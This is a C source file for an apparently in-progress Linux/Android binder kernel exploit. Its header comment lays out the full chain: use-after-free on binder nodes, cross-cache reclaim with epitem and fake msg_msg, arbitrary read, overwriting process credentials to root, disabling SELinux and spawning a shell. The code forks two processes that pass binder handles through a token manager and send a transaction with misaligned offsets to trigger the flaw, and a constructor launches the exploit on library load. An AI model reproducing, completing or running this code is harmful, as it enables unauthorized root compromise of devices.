#include "binder_client.h"
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <linux/fs.h>
#include <stdlib.h>
#include <pthread.h>
#include "binder.h"
#include "exploit.h"
#include "util.h"
#include "token_manager.h"


// Exploit plan:
// Spray messages back and forth, to get fragmented binder allocator
//   TODO: figure out how to do this
//
// UAF on many binder nodes
//
// Then cross cache attack with epitem
//   allocate 2 epitem per fd, try to leak first one to get leak on file and second epitem
//
// UAF on binder node, reclaim with binder ref referencing another node
//   read dangling message to leak other node
//
// UAF on other node we leaked
//   reclaim with fake msg_msg which will overwrite
//   msg_msg will have linked list setup to unlink overwrite one of file inode pointers to epitem
//
// Now arbitrary read is set up
//   leak file f_ops vtable pointer from known address
//   traverse process list with arb read to find target process
//
// perform unlink setup more times
//   overwrite uid and gid to 0
//   set selinux.enforcing to 0
//
// exec shell


typedef struct {
    pthread_barrier_t token_register_barrier;
    struct token a_token;
    struct token b_token;
    pthread_barrier_t send_malicous_barier;
} ExploitCtx;

void init_shared_barrier(pthread_barrier_t *b, int count) {
    pthread_barrierattr_t attr;
    pthread_barrierattr_init(&attr);
    pthread_barrierattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
    pthread_barrier_init(b, &attr, count);
}

void exploit_ctx_init(ExploitCtx *ctx) {
    memset(ctx, 0, sizeof(ExploitCtx));
    init_shared_barrier(&ctx->token_register_barrier, 2);
    init_shared_barrier(&ctx->send_malicous_barier, 2);
}

typedef struct {
    ExploitCtx *ctx;
    binder_client_t binder;
    // handle ref to other process binder node
    u32 remote_handle;
    // node we use to receive messages
    binder_uintptr_t local_node;
} LocalCtx;

#undef PAGE_SIZE
#define PAGE_SIZE (0x1000)

#define PROCESS_A_BINDER 20
#define PROCESS_B_BINDER 40

#define VULN_BINDER 1337

// sends a node with the given node number to the recepient process
void send_node(LocalCtx *ctx, binder_uintptr_t node_num) {
    struct binder_txn *txn = binder_txn_create(ctx->remote_handle, 0, 0);
    binder_txn_add_binder_object(txn, node_num, 0);

    int ret = binder_txn_dispatch(txn, ctx->binder.fd, false, NULL, 0, NULL);
    if (ret < 0) {
        panic("Failed to send node to other process");
    }

    binder_txn_destroy(txn);

    // receive response for transaction (don't do anything with it)
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
    // TODO: figure out if there is some transaction buffer we have to free when reading response
}

// receives a handle to a node
u32 recv_strong_handle(LocalCtx *ctx) {
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
    struct binder_transaction_data *txn;
    int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
    if (ret < 0) {
        panic("Didn't receive transaction");
    }

    binder_uintptr_t *offsets = (binder_uintptr_t *) txn->data.ptr.offsets;
    usize num_offsets = txn->offsets_size / sizeof(binder_uintptr_t);

    for (usize i = 0; i < num_offsets; i++) {
        struct flat_binder_object *object = (struct flat_binder_object *) (txn->data.ptr.buffer + offsets[i]);
        if (object->hdr.type == BINDER_TYPE_HANDLE) {
            u32 handle = object->handle;

            binder_acquire(ctx->binder.fd, handle);
            binder_increfs(ctx->binder.fd, handle);
            binder_free_transaction_buffer(ctx->binder.fd, txn->data.ptr.buffer);

            struct binder_txn *response = binder_txn_create(ctx->remote_handle, 0, 0);
            binder_txn_dispatch(response, ctx->binder.fd, true, NULL, 0, NULL);
            binder_txn_destroy(response);

            return handle;
        }
    }

    panic("No handle found");
}

void do_a(LocalCtx *ctx) {
    binder_enter_looper(ctx->binder.fd);

    send_node(ctx, VULN_BINDER);
    LOGD("A: sent vuln binder to b");

    pthread_barrier_wait(&ctx->ctx->send_malicous_barier);
    LOGD("A: signal that vuln is ready");

    // receive empty message
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
    struct binder_transaction_data *txn;
    int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
    if (ret < 0) {
        panic("A: Didn't receive empty transaction");
    }

    LOGD("A: received vuln transaction");

    // u8 read_buf[256] = { 0 };
    // usize read_amount = 0;

    // // have to do this to receive binder workque items, which is how messages are received
    // binder_enter_looper(ctx->binder.fd);

    // LOGD("A: waiting for read");
    // binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
    // LOGD("A: received transaction");

    // struct binder_transaction_data *txn;
    // int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
    // if (ret < 0) {
    //     LOG("A: didn't recieve transaction");
    //     return;
    // }

    // LOGD("transaction recieved");

    // binder_uintptr_t *offsets = (binder_uintptr_t *) txn->data.ptr.offsets;
    // usize num_offsets = txn->offsets_size / sizeof(binder_uintptr_t);

    // for (usize i = 0; i < num_offsets; i++) {
    //     struct flat_binder_object *object = (struct flat_binder_object *) (txn->data.ptr.buffer + offsets[i]);
    //     LOGD("Got binder type: %u", object->hdr.type);
    // }
}

void do_b(LocalCtx *ctx) {
    binder_enter_looper(ctx->binder.fd);

    u32 vuln_handle = recv_strong_handle(ctx);
    LOGD("B: received strong handle from a: %u", vuln_handle);

    // send transaction with no data to a
    struct binder_txn *empty_txn = binder_txn_create(vuln_handle, 0, 0);
    binder_txn_dispatch(empty_txn, ctx->binder.fd, false, NULL, 0, NULL);
    binder_txn_destroy(empty_txn);

    LOGD("B: sent empty txn");

    // send transaction with binder node to trigger vuln
    struct binder_txn *vuln_txn = binder_txn_create(vuln_handle, 0, 0);
    binder_txn_add_binder_object(vuln_txn, VULN_BINDER, 0);
    // make offsets non aligned
    vuln_txn->offsets_size += 1;

    binder_txn_dispatch(vuln_txn, ctx->binder.fd, false, NULL, 0, NULL);
    binder_txn_destroy(vuln_txn);

    LOGD("B: sent vuln txn");

    binder_client_destroy(&ctx->binder);
    LOGD("B: closed binder socket");

    pthread_barrier_wait(&ctx->ctx->send_malicous_barier);

    // // send binder a's node to itself (test)
    // struct binder_txn *txn = binder_txn_create(ctx->remote_handle, 0, 0);

    // binder_txn_add_binder_object(txn, PROCESS_A_BINDER, 0);

    // LOGD("B: sending transaction");
    // int ret = binder_txn_dispatch(txn, ctx->binder.fd, false, NULL, 0, NULL);
    // if (ret < 0) {
    //     LOG("failed to send transaction to a");
    // }

    // LOGD("B: sent transaction");

    // binder_txn_destroy(txn);
}

void process_a(ExploitCtx *ctx) {
    pin_to_cpu(0);

    LocalCtx local_ctx = { 0 };
    local_ctx.ctx = ctx;
    binder_client_init(&local_ctx.binder, NULL);

    LOG("Binder context created");

    u32 token_manager_handle = -1;
    int ret = find_token_manager(local_ctx.binder.fd, &token_manager_handle);
    if (ret < 0) {
        LOG("Failed to find token manager");
        return;
    }

    LOGD("Token manager found");

    ret = token_manager_register(
        local_ctx.binder.fd,
        token_manager_handle,
        PROCESS_A_BINDER,
        0,
        &ctx->a_token
    );
    if (ret < 0) {
        LOG("Failed to register binder node with token manager");
        return;
    }

    LOGD("Binder node registered in token manager");

    // wait for both process to register with token barrier
    pthread_barrier_wait(&ctx->token_register_barrier);

    u32 b_handle = 0;
    ret = token_manager_lookup(
        local_ctx.binder.fd,
        token_manager_handle,
        &ctx->b_token,
        &b_handle
    );

    if (ret < 0) {
        LOG("Failed to lookup binder handle to b from token manager");
        return;
    }

    LOGD("Got b handle: %u", b_handle);

    local_ctx.remote_handle = b_handle;
    local_ctx.local_node = PROCESS_A_BINDER;

    do_a(&local_ctx);
}

void process_b(ExploitCtx *ctx) {
    pin_to_cpu(0);

    LocalCtx local_ctx = { 0 };
    local_ctx.ctx = ctx;
    binder_client_init(&local_ctx.binder, NULL);

    LOG("Binder context created");

    u32 token_manager_handle = -1;
    int ret = find_token_manager(local_ctx.binder.fd, &token_manager_handle);
    if (ret < 0) {
        LOG("Failed to find token manager");
        return;
    }

    LOGD("Token manager found");

    ret = token_manager_register(
        local_ctx.binder.fd,
        token_manager_handle,
        PROCESS_B_BINDER,
        0,
        &ctx->b_token
    );
    if (ret < 0) {
        LOG("Failed to register binder node with token manager");
        return;
    }

    LOGD("Binder node registered in token manager");

    // wait for both process to register with token barrier
    pthread_barrier_wait(&ctx->token_register_barrier);

    u32 a_handle = 0;
    ret = token_manager_lookup(
        local_ctx.binder.fd,
        token_manager_handle,
        &ctx->a_token,
        &a_handle
    );

    if (ret < 0) {
        LOG("Failed to lookup binder handle to b from token manager");
        return;
    }

    LOGD("Got a handle: %u", a_handle);

    local_ctx.remote_handle = a_handle;
    local_ctx.local_node = PROCESS_B_BINDER;

    do_b(&local_ctx);
}

void exploit() {
    // exploit context should be in shared memory
    ExploitCtx *ctx = SYSCHK(mmap(NULL, sizeof(ExploitCtx), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0));;

    exploit_ctx_init(ctx);

    if (SYSCHK(fork()) == 0) {
        // process B executes vuln to get UAF values in process A
        process_b(ctx);
    } else {
        // process A instructs process b to do vuln, then performs rest of exploit
        process_a(ctx);
    }
}

static void init() __attribute__((constructor));
void init() {
    unsetenv("LD_PRELOAD");
    puts("Starting exploit...");
    exploit();
}